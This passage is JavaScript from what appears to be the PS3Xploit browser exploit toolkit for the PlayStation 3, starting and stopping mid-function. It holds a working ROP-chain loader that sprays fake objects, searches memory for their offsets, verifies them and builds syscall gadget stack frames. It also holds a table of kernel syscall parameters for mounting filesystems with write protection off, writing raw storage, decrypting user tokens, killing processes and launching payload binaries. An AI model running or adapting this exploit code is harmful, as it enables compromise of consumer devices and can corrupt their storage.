        return unescape("\u4141")+str2u(path_usb_default)+unescape("\u0000\u0000\u4141\u4141\uFD6B");// path+12 bytes
    }
    else{
        return;
    }
}


// Loader Functions
function findBase()
{
    findOffset("base_fp");
    return base_found;
}

function findStackFrame()
{
    findOffset("stack_frame");
    return stackframe_found;
}

function findJump2()
{
    findOffset("jump_2");
    return j2_found;
}

function findJump1()
{
    findOffset("jump_1");
    return j1_found;
}

function verifySuccessTrigger()
{
    if(debug_mode)logAdd(verify_success);
    if(t_out!=0){searchResetTimeout();}
    searchSucceed();
    enableActiveTrigger();
    load_rop.focus();
    allOffsetsVerified=true;
    //result_msg=msg_verified_offsets;// change to verified status
    //showFoundOffsetsMsg();
    showFoundOffsets(offset_find_verified);
    //showFoundOffsets(offset_find_success);
}

function verifyFailTrigger()
{
    if(debug_mode)logAdd(verify_fail);
    if(total_loops<max_loops){reloadInitROP();}
    else{failCount+=1;searchFail();}
    reload_page.focus();
}

function verifyOffsets()
{
    if(!base_verified)
    {
        base=checkMemory(base_fp_addr-0x4,0x1000,base_fp.length,6);
        if(base===base_fp){base_offsets.push(base_fp_addr);base_verified=true;}else{base_verified=false;base_found=false;allOffsetsFound=false;}
        showFoundOffsets(offset_find_base_fp);
    }
    
    if(!j2_verified)
    {
        j2=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length,6);
        if(j2===jump_2){jump2_offsets.push(jump_2_addr);j2_verified=true;}else{j2_verified=false;j2_found=false;allOffsetsFound=false;}
        showFoundOffsets(offset_find_jump2);
    }
    
    if(!j1_verified)
    {
        j1=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length,6);
        if(j1===jump_1){jump1_offsets.push(jump_1_addr);j1_verified=true;}else{j1_verified=false;j1_found=false;allOffsetsFound=false;}
        showFoundOffsets(offset_find_jump1);
    }
    
    //stack_offsets.push(stack_frame_addr);stackframe_verified=true;stack_frame_acolor=colorVerifiedFake;
    if(!stackframe_verified)
    {
        stk=checkMemory(stack_frame_addr-0x4,0x10000,stack_frame.length,6);
        if(stk===stack_frame){stack_offsets.push(stack_frame_addr);stackframe_verified=true;}else{stackframe_verified=false;stackframe_found=false;allOffsetsFound=false;}
        showFoundOffsets(offset_find_stack_frame);
    }
    
    if((j2_verified)&&(j1_verified)&&(base_verified)&&(stackframe_verified)){allOffsetsVerified=true;}else{allOffsetsVerified=false;}
}


// Main Search Function
function findOffset(name)
{
    
    switch(name)
    {
        case "base_fp":
        base_fp=unescape("\u4242\u0000")+hexw2bin(setFileMode("wb"))+hexw2bin(write_bytes)+hexw2bin(usb_fp)+hexw2bin(usb_fp2)+hexw2bin(hdd_fp)+hexw2bin(hdd_fp2)+hexw2bin(usb_fd)+hexw2bin(usb_fd2)+hexw2bin(hdd_fd)+hexw2bin(hdd_fd2)+hexw2bin(fd)+hexw2bin(fd2)+hexw2bin(magic)+hexw2bin(magic2)+unescape("\u0000")+str2u(path_fp)+unescape("\u0000")+str2u(path_fp2)+unescape("\u0000")+str2u(path_src_fp)+unescape("\u0000")+str2u(path_dest_fp)+unescape("\u0000\uFD6C");
        ph = 0x6CFD;

        do
        {
            if(search_max_threshold<search_range_size){
            if(total_loops<max_loops){reloadInitROP();}
            else{searchFail();}
            return;}
            base_found=false;
            base_fp=base_fp.replaceAt(0,hexh2bin(ph));
            base_fp_addr=findJsVariableOffset("base_fp",base_fp,search_base_offset,search_range_size,debug_mode);
            search_max_threshold-=search_range_size;
        }while(base_fp_addr==0);
        if(base_fp_addr!=0){base_found=true;base_offsets.push(base_fp_addr);setPointerOffsets();}else{base_found=false;}
        break;
        
        case "stack_frame":
        useCustomStackFrame();// call this to setup all params
        //stackFrameTest();// use default stackframe for testing
        
        stack_frame=unescape(syscallGadgetSetStartBytes())+unescape(syscallGadgetSet1(a1_r3,a1_r4,a1_r5,a1_r6,a1_r7,a1_r8,a1_r9,a1_r10,a1_r11,a1_r29,a1_r30,a1_r31,a1_jumpto,a2_r3,a2_r29,a2_r30,a2_r31,a2_jumpto,a3_r3,a3_r4,a3_r5,a3_r6,a3_r7,a3_r8,a3_r9,a3_r10,a3_r11,a3_r29,a3_r30,a3_r31,a3_jumpto,a4_r3,a4_r29,a4_r30,a4_r31,a4_jumpto,a5_r3,a5_r4,a5_r5,a5_r6,a5_r7,a5_r8,a5_r9,a5_r10,a5_r11,a5_r29,a5_r30,a5_r31,a5_jumpto,a6_r3,a6_r29,a6_r30,a6_r31,a6_jumpto,a7_r3,a7_r4,a7_r5,a7_r6,a7_r7,a7_r8,a7_r9,a7_r10,a7_r11,a7_r29,a7_r30,a7_r31,a7_jumpto,a8_r3,a8_r29,a8_r30,a8_r31,a8_jumpto,a9_r3,a9_r4,a9_r5,a9_r6,a9_r7,a9_r8,a9_r9,a9_r10,a9_r11,a9_r29,a9_r30,a9_r31,a9_jumpto,a10_r3,a10_r29,a10_r30,a10_r31,a10_jumpto,a11_r3,a11_r4,a11_r5,a11_r6,a11_r7,a11_r8,a11_r9,a11_r10,a11_r11,a11_r29,a11_r30,a11_r31,a11_jumpto,a12_r3,a12_r29,a12_r30,a12_r31,a12_jumpto,a13_r3,a13_r4,a13_r5,a13_r6,a13_r7,a13_r8,a13_r9,a13_r10,a13_r11,a13_r29,a13_r30,a13_r31,a13_jumpto,a14_r3,a14_r29,a14_r30,a14_r31,a14_jumpto,a15_r3,a15_r4,a15_r5,a15_r6,a15_r7,a15_r8,a15_r9,a15_r10,a15_r11,a15_r29,a15_r30,a15_r31,a15_jumpto,a16_r3,a16_r29,a16_r30,a16_r31,a16_jumpto,a17_r3,a17_r4,a17_r5,a17_r6,a17_r7,a17_r8,a17_r9,a17_r10,a17_r11,a17_r29,a17_r30,a17_r31,a17_jumpto,a18_r3,a18_r29,a18_r30,a18_r31,a18_jumpto,a19_r3,a19_r29,a19_r30,a19_r31,a19_jumpto,a20_r3,a20_r4,a20_r5,a20_r6,a20_r7,a20_r8,a20_r9,a20_r10,a20_r11,a20_r29,a20_r30,a20_r31,a20_jumpto,a21_r3,a21_r29,a21_r30,a21_r31,a21_jumpto,a22_r3,a22_r29,a22_r30,a22_r31,a22_jumpto,a23_r3,a23_r4,a23_r5,a23_r6,a23_r7,a23_r8,a23_r9,a23_r10,a23_r11,a23_r29,a23_r30,a23_r31,a23_jumpto,a24_r3,a24_r29,a24_r30,a24_r31,a24_jumpto,a25_r3,a25_r29,a25_r30,a25_r31,a25_jumpto,a26_r3,a26_r4,a26_r5,a26_r6,a26_r7,a26_r8,a26_r9,a26_r10,a26_r11,a26_r29,a26_r30,a26_r31,a26_jumpto,a27_r3,a27_r29,a27_r30,a27_r31,a27_jumpto,a28_r3,a28_r29,a28_r30,a28_r31,a28_jumpto,a29_r3,a29_r4,a29_r5,a29_r6,a29_r7,a29_r8,a29_r9,a29_r10,a29_r11,a29_r29,a29_r30,a29_r31,a29_jumpto,a30_r3,a30_r29,a30_r30,a30_r31,a30_jumpto,a31_r3,a31_r29,a31_r30,a31_r31,a31_jumpto,a32_r3,a32_r4,a32_r5,a32_r6,a32_r7,a32_r8,a32_r9,a32_r10,a32_r11,a32_r29,a32_r30,a32_r31,a32_jumpto,a33_r3,a33_r29,a33_r30,a33_r31,a33_jumpto,padding1,padding2,padding3,padding4,extra1,extra2,extra3,extra4,extra5,extra6,extra7))+unescape(syscallGadgetSetEndBytes());
        ph = 0x7EBE;
        search_base_offset=search_base_offset_min+search_base_offset_adjust;

        do
        {
            if(search_max_threshold<search_range_size){
            if(total_loops<max_loops){reloadInitROP();}
            else{searchFail();}
            return;}
            stackframe_found=false;
            stack_frame=stack_frame.replaceAt(0,hexh2bin(ph));
            stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base_offset,search_range_size,debug_mode);
            search_max_threshold-=search_range_size;
        }while(stack_frame_addr==0);
        if(stack_frame_addr!=0){stackframe_found=true;stack_offsets.push(stack_frame_addr);}else{stackframe_found=false;}
        break;
        
        case "jump_2":
        jump_2=unescape("\u4141\u0000")+hexw2bin(stack_frame_addr)+unescape("\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950")+hexw2bin(stack_frame_addr)+unescape("\uFB7E");
        ph = 0x7EFB;
        search_base_offset=search_base_offset_min+search_base_offset_adjust_jump2;

        do
        {
            if(search_max_threshold<search_range_size){
            if(total_loops<max_loops){reloadInitROP();}
            else{searchFail();}
            return;}
            j2_found=false;
            jump_2=jump_2.replaceAt(0,hexh2bin(ph));
            jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base_offset,search_range_size,debug_mode);
            search_max_threshold-=search_range_size;
        }while(jump_2_addr==0);
        if(jump_2_addr!=0){j2_found=true;jump2_offsets.push(jump_2_addr);}else{j2_found=false;}
        break;
        
        case "jump_1":
        //jump_1=reload_jump1(true);
        jump_1=unescape("\u4141\u0000")+hexw2bin(jump_2_addr)+unescape("\uBF6E");
        ph = 0x6EBF;
        search_base_offset=search_base_offset_min+search_base_offset_adjust_jump1;

        do
        {
            if(search_max_threshold<search_range_size){
            if(total_loops<max_loops){reloadInitROP();}
            else{searchFail();}
            return;}
            j1_found=false;
            jump_1=jump_1.replaceAt(0,hexh2bin(ph));
            jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base_offset,search_range_size,debug_mode);
            search_max_threshold-=search_range_size;
        }while(jump_1_addr==0);
        if(jump_1_addr!=0){j1_found=true;jump1_offsets.push(jump_1_addr);}else{j1_found=false;}
        break;
        
        default:
        break;
    }
}
// PS3 Default Syscall Arguments
// PS3Xploit Team 2018 / ps3xploit.com

        
// Test Arguments
//var test_arg1=0xDEADBEEF
//var test_arg2=0xDEADBABE
//var test_arg3=0xDEADCAFE
//var test_arg4=0xBABECAFE
//var test_arg5=0xBEEFCAFE
//var test_arg6=0xCAFEBABE

// sys_sm_ring_buzzer Parameters
var sc_sys_sm_ring_buzzer=0x00000188
var sc_buzzer_arg1=0x00001004
var sc_buzzer_arg2=0x0000000A
var sc_buzzer_arg3=0x000001B6
var sc_buzzer_1_beep=0x000001B6
var sc_buzzer_2_beeps=0x000001B0
var sc_buzzer_3_beeps=0x000001B6
var sc_buzzer_no_of_beeps=0x000001B6

// sm_shutdown Parameters
var sc_shutdown=0x0000017B
var sc_shutdown_off=0x00001100 // Power Off
var sc_shutdown_hard=0x00001200 // LV2 Hard Reboot
var sc_shutdown_soft=0x00000200 // LV2 Soft Reboot

// sys_fs_mkdir Parameters
var sc_sys_fs_mkdir=0x0000032B;
var sc_fs_mode=0x00000100;// CELL_FS_O_CREAT

// sys_ss_get_open_psid Parameters
var sc_sys_ss_get_open_psid=0x00000368;


var sc_sys_fs_open=0x00000321;
var open_path=0x8A000000;
var open_flag_read=0x00000000;
var open_flag_create=0x00000241;
var open_flag_create_append=0x441;
var open_flag_create_excl=0xC1;
var open_fd=0x00000000;
var open_size_default=0x00000140;
var open_mode=0x8A0000D0;
var open_arg=0x00000000;

var sc_sys_fs_read=0x00000322;
var read_fd=0x00000000;
var read_buf=0x8A000100;
var read_nbytes=0x00000140;
var read_nread=0x8A000000;

var sc_sys_fs_write=0x00000323;
var write_fd=0x00000000;
var write_buf=0x8A000100;
var write_nbytes=0x00000140;
var write_nwrite=0x8A000100;

var sc_sys_fs_close=0x00000324;

var sys_fs_opendir=0x00000325;
var sc_opendir_path=0x8A000000;
var sc_opendir_fd=0x8A000100;

var sys_fs_readdir=0x00000326;
var sc_readdir_fd=0x8A000200;
var sc_readdir_path=0x8A000300;
var sc_readdir_nread=0x8A000400;

var sys_fs_closedir=0x00000327;
var sc_closedir_fd;

// sys_fs_chmod Parameters
var sc_sys_fs_chmod=0x00000342;
var sc_chmod_arg=0x00000FFF;
//var sc_chmod_400=0x00000F00;
//var sc_chmod_640=0x00000FA0;
//var sc_chmod_660=0x00000FB0;
var sc_chmod_700=0x00000FC0;
var sc_chmod_701=0x00000FC1;
var sc_chmod_755=0x00000FED;
var sc_chmod_777=0x00000FFF;

// sys_fs_chown Parameters
var sc_sys_fs_chown=0x00000343;
var sc_chown_arg=0x00000000;
var sc_chown_0=0x00000000;

// sys_fs_rename Parameters
var sc_sys_fs_rename=0x0000032C;

// sys_fs_rmdir Parameters
var sc_sys_fs_rmdir=0x0000032D;

// sys_fs_symbolic_link Parameters
var sc_sys_fs_symbolic_link=0x00000341;

// sys_fs_link Parameters
var sc_sys_fs_link=0x0000032A;

// sys_fs_unlink Parameters
var sc_sys_fs_unlink=0x0000032E;

// sys_fs_mapped_allocate Parameters
var sc_sys_fs_mapped_allocate=0x0000034D;
var fs_mapped_allocate_arg1=0x00000000;
var fs_mapped_allocate_arg2=0x00000000;
var fs_mapped_allocate_arg3=0x8A000000;

// sys_fs_mapped_free Parameters
var sc_sys_fs_mapped_free=0x0000034E;
var fs_mapped_free_arg1=0x00000000;
var fs_mapped_free_arg2=0x8A000500;

// sys_fs_get_fs_info Parameters
var sc_sys_fs_get_fs_info=0x0000034C;
var fs_get_fs_info_arg1=0x8A000000;
var fs_get_fs_info_arg2=0x8A001000;
var fs_get_fs_info_buffer=0x8A002000;
var fs_get_fs_info_dump_size=0x10000;

// sys_fs_get_mount_info Parameters
var sc_sys_fs_get_mount_info=0x0000034A;
var fs_get_mount_info_arg1=0x8A001000;
var fs_get_mount_info_arg2=0x00000000;
var fs_get_mount_info_arg3=0x8A002000;

// sys_fs_mount Parameters
// r3 = CELL_FS_UTILITY:HDD1
// r4 = CELL_FS_SIMPLEFS / CELL_FS_FAT
// r5 = /dev_hdd1
// r6-r10 = 0
var sc_sys_fs_mount=0x00000345;
var fs_mount_device_name=0x00000004;
var fs_mount_filesystem=0x00000000;
var fs_mount_device_path="/dev_blind/";
var fs_mount_arg4=0x00000000;
var fs_mount_write_protection=0x00000001;
var fs_mount_write_protection_off=0x00000000;
var fs_mount_write_protection_on=0x00000001;
var fs_mount_arg6=0x00000000;
var fs_mount_arg7=0x00000000;
var fs_mount_arg8=0x00000000;

// sys_fs_unmount Parameters
var sc_sys_fs_unmount=0x00000346;
var fs_unmount_path=0x8A001000;
var fs_unmount_arg2=0x00000000;
var fs_unmount_arg3=0x00000000;

// sys_fs_newfs Parameters
var sc_sys_fs_newfs=0x00000344;
var fs_newfs_device_name=0x8A0000000;
var fs_newfs_arg2=0x8A0000100;
var fs_newfs_arg3=0x8A000200;

// sys_storage_get_device_info Parameters
// int sys_storage_get_device_info(uint64_t device, uint8_t *buffer)
// buffer[40]=total sectors,buffer[48]=sector size,buffer[53]=writable
var sc_sys_storage_get_device_info=0x00000261;
var storage_get_device_info_device=0x00000007;// hdd default
var storage_get_device_info_buffer_ptr=0x8A0000000;// returns id
var storage_get_device_info_arg3=0x00000000;// unk
var storage_get_device_info_arg4=0x00000000;// unk

// sys_storage_report_devices  Parameters
var sc_sys_storage_report_devices=0x00000263;
var storage_report_devices_arg1_ptr=0x8C000000;// contains 0
var storage_report_devices_arg2=0x00000000;
var storage_report_devices_arg3_ptr=0x8A0000000;// uses return id from sys_storage_get_device_info
var storage_report_devices_arg4=0x8A000100;

// sys_storage_open Parameters
var sc_sys_storage_open=0x00000258;
var sc_sso_mode=0x00000000;
var sc_sso_flags=0x00000000;

// sys_storage_close Parameters
var sc_sys_storage_close=0x00000259;

// sys_storage_read Parameters
var sc_sys_storage_read=0x0000025A;
var sc_ssr_mode=0x00000000;
var sc_ssr_flags=0x00000000;

// sys_storage_write Parameters
var sc_sys_storage_write=0x0000025B;

// sys_fs_stat Parameters
var sc_sys_fs_stat=0x00000328;
var sys_fs_stat_path=0x00000000;

var sys_fs_stat_sb=0x8A000000;
// sys_fs_fstat  Parameters
var sc_sys_fs_fstat =0x00000329;
var sys_fs_fstat_path=0x00000000;
var sys_fs_fstat_sb=0x00000000;

// sys_update_manager Parameters
var update_manager_if=0x0000035F;

// sys_console_write Parameters
var sc_sys_console_write=0x0000018E;
var console_write_ptr=0x80000000;
var console_write_len=0x00100000;

// sys_tty_write Parameters
var sc_sys_tty_write=0x00000193;
var tty_write_char=0x00000000;// pointer
var tty_write_buf=0x00000000;// pointer
var tty_write_size=0x00100000;
var tty_write_pwritelen=0x00000000;// pointer

// sys_tty_read Parameters
var sc_sys_tty_read=0x00000192;
var tty_read_char=0x00000000;// pointer
var tty_read_buf=0x00000000;// pointer
var tty_read_size=0x00100000;
var tty_read_preadlen=0x00000000;// pointer

// sys_process_exit Parameters
var sc_sys_process_exit=0x00000016;
var process_exit_pid=0x01000300;// default VSH

// sys_process_kill Parameters
var sc_sys_process_kill=0x00000013;
var process_kill_pid=0x01000300;// default VSH

// sys_ppu_thread_get_stack_information Parameters
var sc_ppu_thread_get_stack_info=0x00000031;

// sys_ppu_thread_create Parameters
// int sys_ppu_thread_create(sys_ppu_thread_t *thread_id, & void (*entry)(uint64_t), uint64_t arg, 0, int prio, size_t stacksize, uint64_t flags, const char *threadname); 
var sys_ppu_thread_create=0x00000034;
var thread_create_id_ptr=0x89001000;
var thread_create_bin_ptr=0x89001100;// /dev_hdd0/game/PS3XPLOIT/USRDIR/payloads/default.bin
var thread_create_bin_arg=0x00000000;
var thread_create_prio=0x00000000;
var thread_create_stk_size=0x00000000;
var thread_create_flags=0x00000000;
var thread_create_name=0x89001200;// Hello_From_PS3Xploit;

// sys_ppu_thread_exit Parameters
// int sys_ppu_thread_exit(int errorcode)
var sys_ppu_thread_exit=0x00000029;
var thread_exit_arg1=0x00000000;

// sys_ppu_thread_restart Parameters
// int sys_ppu_thread_restart(void); 
var sys_ppu_thread_restart=0x00000033;
var thread_restart_arg1=0x89010000;

// sys_ppu_thread_start Parameters
// int sys_ppu_thread_start(sys_ppu_thread_t thread_id); 
var sys_ppu_thread_start=0x00000035;
var thread_start_arg1=0x0100002A;// VSH Default

// sys_ppu_thread_stop Parameters
// int sys_ppu_thread_stop(sys_ppu_thread_t thread_id); 
var sys_ppu_thread_stop=0x00000032;
var thread_stop_arg1=0x0100002A;// VSH Default

// sys_ppu_thread_get_priority Parameters
var sys_sys_ppu_thread_get_priority=0x00000030;

// sys_sm_ Parameters
var sc_sys_sm_=0x0000017E;

// sys_sm_request_error_log Parameters
var sc_sys_sm_request_error_log=0x00000186;

// sys_sm_request_led Parameters
var sc_sys_sm_request_led=0x00000181;
var request_led_id=0x8C000000;
var request_led_action=0x8C000010;
var request_led_return=0x8C000020;

// sys_sm_control_led Parameters
var sc_sys_sm_control_led =0x00000182;
var control_led_id=0x00000000;
var control_led_id_off=0x00000000;
var control_led_id_green=0x00000001;
var control_led_id_red=0x00000002;
var control_led_id_yellow=0x00000003;
var control_led_action=0x00000000;
var control_led_action_off=0x00000000;
var control_led_action_on=0x00000001;
var control_led_action_blink_fast=0x00000002;
var control_led_action_blink_slow=0x00000003;

// sys_game_get_temperature Parameters
var sc_sys_game_get_temperature =0x0000017F;
var get_temperature=0x00000000;
var get_temperature_cell=0x00000000;
var get_temperature_rsx=0x00000001;
var get_temperature_temp_cell_ptr=0x8C000100;
var get_temperature_temp_rsx_ptr=0x8C000200;

// sys_sm_get_fan_policy Parameters
// sys_sm_get_fan_policy(0, &st, &mode, &fan_speed8, &unknown);
var sc_sys_sm_get_fan_policy=0x00000199;
var get_fan_policy_status=0x8C000000;
var get_fan_policy_state=0x8C000010;
var get_fan_policy_return=0x8C000020;

// sys_sm_set_fan_policy Parameters
// sys_sm_set_fan_policy(0, 2, fan_speed);
var sc_sys_sm_set_fan_policy=0x00000185;
var set_fan_speed=0x000000FF;
var set_fan_speed_30=0x000000FF;
var set_fan_speed_40=0x000000FF;
var set_fan_speed_50=0x000000FF;
var set_fan_speed_60=0x000000FF;
var set_fan_speed_70=0x000000FF;
var set_fan_speed_80=0x000000FF;
var set_fan_speed_90=0x000000FF;
var set_fan_speed_99=0x000000FF;

var set_fan_arg2=0x000000FF;
var set_fan_arg3=0x000000FF;


var sc_sys_ss_utoken_if=0x0000036D;
var sys_ss_utoken_if_packetid=0x00025006;// default value
var sys_ss_utoken_if_packetid_enc=0x00025001;// Encrypt User Token
var sys_ss_utoken_if_packetid_dec=0x00025002;// Decrypt User Token
var sys_ss_utoken_if_packetid_dec_lv2=0x00025003;// (LV2) Decrypt User Token uint8_t out[0xC50], uint64_t size (0xC50)
var sys_ss_utoken_if_packetid_unk_lv2=0x00025004;// (LV2) 
var sys_ss_utoken_if_packetid_enc_lv2=0x00025005;// (LV2) Encrypt User Token uint8 out[0xC50], uint64_t size (0xC50)
var sys_ss_utoken_if_packetid_table_lv2=0x00025006;// (LV2) Retrieve Level 2 Syscall Table 0, uint8 out[size], uint64_t size (0x2000) 
var sys_ss_utoken_if_tokenptr=0x8C000000;
var sys_ss_utoken_if_size=0x00000C50;
var sys_ss_utoken_if_size_lv2=0x00002000;


var sc_sys_rsx_memory_free=0x0000029D;
var sys_rsx_memory_free_mem_ctx_id=0x00000001;

var sc_sys_dbg_get_process_memory_container_information=0x000003BD;
var sys_dbg_gpmci_proc_id=0x00000000;
var sys_dbg_gpmci_dbg_mc_info=0x00000000;
var sys_dbg_gpmci_count=0x00000000;
var sys_dbg_gpmci_proc_id=0x00000000;

var sc_sys_dbg_get_lwcond_information=0x000003B7;
var sys_dbg_get_lwcond_information_pid=0x00000000;
var sys_dbg_get_lwcond_information_id=0x00000000;
var sys_dbg_get_lwcond_information_info_ptr=0x00000000;

var sc_sys_dbg_get_event_flag_information=0x000003CB;
var sys_dbg_get_event_flag_information_pid=0x00000000;
var sys_dbg_get_event_flag_information_event_flag=0x00000000;
var sys_dbg_get_event_flag_information_info_ptr=0x00000000;

var sc_sys_dbg_send_event_flags=0x000003BF;
var sys_dbg_send_event_flags_id=0x00000000;
var sys_dbg_send_event_flags_arg2=0x00000000;
var sys_dbg_send_event_flags_arg3=0x00000000;
var sys_dbg_send_event_flags_arg4=0x00000000;

var sc_sys_dbg_send_event_flags2=0x000003CC;
var sys_dbg_send_event_flags2_id=0x00000000;

var sc_sys_crypto_engine_create=0x000003D0;
var sys_crypto_engine_create_pid=0x00000000;

var sc_sys_crypto_engine_destroy=0x000003D0;
var sys_crypto_engine_destroy_pid=0x00000000;

/* 
int sys_crypto_engine_hasher_prepare(sys_pid_t id, int32_t hash_key_index); 
uses HMAC-SHA1 with key size of 0x14 bytes
keys are generated by VTRM (master)
*/ 
var sc_sys_crypto_engine_hasher_prepare=0x000003D2;
var sys_crypto_engine_hasher_prepare_pid=0x00000000;
var sys_crypto_engine_hasher_prepare_hash_key_index=0x00000000;

/* 
int sys_crypto_engine_hasher_run(sys_pid_t id, const void* data, uint32_t data size);
splits data by chunks of 0x400 bytes max
*/ 
var sc_sys_crypto_engine_hasher_run=0x000003D3;
var sys_crypto_engine_hasher_run_pid=0x00000000;
var sys_crypto_engine_hasher_run_data_ptr=0x8A000100;
var sys_crypto_engine_hasher_run_size=0x00000000;

/* 
int sys_crypto_engine_hasher_get_hash(sys_pid_t id, void* buffer, uint32_t max_buffer_size >= 0x14); 
*/ 
var sc_sys_crypto_engine_hasher_get_hash=0x000003D4;
var sys_crypto_engine_hasher_run_pid=0x00000000;
var sys_crypto_engine_hasher_run_buffer_ptr=0x8A000200;
var sys_crypto_engine_hasher_run_max_buffer_size=0x00000000;

/* 
int sys_crypto_engine_cipher_prepare(sys_pid_t id, int32_t hash_key_index, int32_t mode, int32_t cipher_key_index, const void* iv, uint32_t iv_size);  
Mode: 1:encrypt, 2:decrypt
uses AES-CBC-128, keys are generated by VTRM (master)
*/ 
var sc_sys_crypto_engine_cipher_prepare=0x000003D5;
var sys_crypto_engine_cipher_prepare_pid=0x00000000;
var sys_crypto_engine_cipher_prepare_hash_key_index=0x00000000;
var sys_crypto_engine_cipher_prepare_mode=0x00000000;
var sys_crypto_engine_cipher_prepare_cipher_key_index=0x00000000;
var sys_crypto_engine_cipher_prepare_iv_ptr=0x8A000300;
var sys_crypto_engine_cipher_prepare_iv_size=0x00000000;

/* 
int sys_crypto_engine_cipher_run(sys_pid_t id, const void* input, void* output, uint32_t data_size);
splits data by chunks of 0x400 bytes max
*/ 
var sc_sys_crypto_engine_cipher_run=0x000003D6;
var sys_crypto_engine_cipher_run_pid=0x00000000;
var sys_crypto_engine_cipher_run_input_ptr=0x8A000400;
var sys_crypto_engine_cipher_run_output_ptr=0x8C000400;
var sys_crypto_engine_cipher_run_data_size=0x00000000;

/* 
int sys_crypto_engine_cipher_get_hash(sys_pid_t id, void* buffer, uint32_t max_buffer_size >= 0x14); 
*/ 
var sc_sys_crypto_engine_cipher_get_hash=0x000003D7;
var sys_crypto_engine_cipher_get_hash_pid=0x00000000;
var sys_crypto_engine_cipher_get_hash_buffer_ptr=0x8A000800;
var sys_crypto_engine_cipher_get_hash_max_buffer_size=0x00000000;

/* 
int sys_crypto_engine_random_generate(void* buffer, uint32_t max_buffer_size >= 0x10
*/ 
var sc_sys_crypto_engine_random_generate=0x000003D8;
var sys_crypto_engine_random_generate_buffer_ptr=0x00000000;
var sys_crypto_engine_random_generate_max_buffer_size=0x00000000;

/* 
returns Console Type, syscall(985,uint64_t * type)
1=CEX  2=DEX  3=TOOL
*/ 
var sc_sys_dbg_get_console_type=0x000003D9;
var sys_dbg_get_console_type_ptr=0x8A000100;

/* 
syscall(988,int i,0) , i <0x10 (1 or 2 or 4 or 8 or 0x10) 
*/ 
var sc_sys_dbg_ppu_exception_handler=0x000003DC;
var sys_dbg_ppu_exception_handler_arg1=0x00000001;
//var sys_dbg_ppu_exception_handler_arg1=0x00000002;
//var sys_dbg_ppu_exception_handler_arg1=0x00000004;
//var sys_dbg_ppu_exception_handler_arg1=0x00000008;
//var sys_dbg_ppu_exception_handler_arg1=0x00000010;
var sys_dbg_ppu_exception_handler_arg2=0x00000000;

/* 
syscall(989, (spu) thread_id ,out:uint8[0x20])
*/ 
var sc_sys_dbg_spu_unk1=0x000003DD;
var sys_dbg_spu_unk1_thread_id=0x00000000;
var sys_dbg_spu_unk1_out=0x00000000;


// int sys_net_open_dump ( int len, int flags )
var sc_sys_net_open_dump=0x000002CD;
var sys_net_open_dump_len=0x01000000;
var sys_net_open_dump_flags=0x00000000;

// int sys_net_read_dump ( int id, void *buf, int len, int *pflags )
var sc_sys_net_read_dump=0x000002CE;
var sys_net_read_dump_id=0x00000001;
var sys_net_read_dump_buf_ptr=0x8A000100;
var sys_net_read_dump_id_len=0x01000000;
var sys_net_read_dump_id_pflags_ptr=0x8A000000;

// int sys_net_write_dump ( char *buf )
var sc_sys_net_write_dump=0x000002D0;
var sys_net_write_dump_buf_ptr=0x8B000000;

// int sys_net_close_dump ( int id, int *pflags )
var sc_sys_net_close_dump=0x000002CF;
var sys_net_close_dump_id=0x00000001;
var sys_net_close_dump_pflags_ptr=0x8A000020;

// syscall(387, uint8_t platform_info[0x18])
var sc_sys_sm_get_platform_info=0x00000183;
var sys_sm_get_platform_info_ptr=0x8A000000;
var sys_sm_get_platform_info_size=0x00000020;


// int sys_prx_register_library(void* library)
var sc_sys_prx_register_library=0x000001E6;
var sys_prx_register_library_ptr=0x8A000000;

// int sys_prx_unregister_library(void* library)
var sc_sys_prx_unregister_library=0x000001E7;
var sys_prx_unregister_library_ptr=0x8A000000;

// sys_prx_id_t sys_prx_load_module(const char* path, sys_prx_flags_t flags, sys_prx_load_module_option_t* pOpt)
var sc_sys_prx_load_module=0x000001E0;
var sys_prx_load_module_path=0x8A001000;
var sys_prx_load_module_flags=0x00000000;
var sys_prx_load_module_popt=0x8A002000;// pointer to 0

// int sys_prx_start_module(sys_prx_id_t id, sys_prx_flags_t flags, sys_prx_start_t* pOpt)
var sc_sys_prx_start_module=0x000001E1;
var sys_prx_start_module_id=0x00000000;
var sys_prx_start_module_flags=0x00000000;
var sys_prx_start_module_popt=0x00000000;
var sys_prx_start_module_unk1=0x8A003000;
var sys_prx_start_module_unk2=0x00000000;






// PS3 Default Stack Frame Pointers Gadget Hex
// PS3Xploit Team 2018 / ps3xploit.com


// Gadget Stackframe Setup

// Samples 100 bytes each
/*
\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900
*/

/*
\uA0A1\uA2A3\uA4A5\uA6A7\uA8A9\uAAAB\uACAD\uAEAF\uB0B1\uB2B3\uB4B5\uB6B7\uB8B9\uBABB\uBCBD\uBEBF\uC0C1\uC2C3\uC4C5\uC6C7\uC8C9\uCACB\uCCCD\uCECF\uD0D1\uD2D3\uD4D5\uD6D7\uD8D9\uDADB\uDCDD\uDEDF\uE0E1\uE2E3\uE4E5\uE6E7\uE8E9\uEAEB\uECED\uEEEF\uF0F1\uF2F3\uF4F5\uF6F7\uF8F9\uFAFB\uFCFD\uFEFF\uFFFF\u0000
*/


function syscallGadgetSetStartBytes()
{
